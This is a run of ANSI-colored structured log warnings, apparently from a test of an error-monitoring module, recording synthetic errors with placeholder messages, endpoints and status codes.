WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781860Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1778'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781912Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1779'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.781962Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1780'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782016Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1781'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782069Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1782'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782119Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1783'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782168Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1784'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782225Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1785'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782275Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1786'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782324Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1787'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782429Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1788'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782499Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1789'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782555Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1790'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782607Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1791'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782658Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1792'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782707Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1793'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782762Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1794'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782815Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1795'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782867Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1796'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782918Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1797'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.782969Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1798'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783020Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m36[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1799'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783071Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1800'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783120Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1801'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783169Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1802'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783218Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1803'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783267Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1804'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783316Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1805'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783365Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1806'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783414Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1807'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783462Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1808'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783510Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1809'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783558Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1810'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783607Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1811'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783654Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1812'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783703Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1813'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783750Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1814'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783797Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1815'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783901Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1816'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.783974Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m37[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 1817'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
